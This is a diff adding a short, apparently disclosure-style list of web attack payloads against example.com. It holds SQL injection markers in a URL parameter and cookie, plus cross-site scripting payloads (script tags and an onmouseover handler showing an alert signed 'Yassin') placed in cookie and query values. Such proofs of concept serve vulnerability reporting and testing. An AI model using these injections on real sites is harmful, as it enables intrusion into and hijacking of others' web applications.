@@ -1,0 +1,6 @@
+http://www.example.com/?a=19&c=id [SQL Attack]
+Cookie: language_id=1[SQL attack]
+Cookie: </div><script>alert('Xssed-By-Yassin');</script>
+http://www.example.com/index.php?a=19&c=</div><script>alert('Xssed By
+Yassin');</script>
+http://www.example.com/?a=19&c="+onmouseover=alert('Xssed-By-Yassin')+
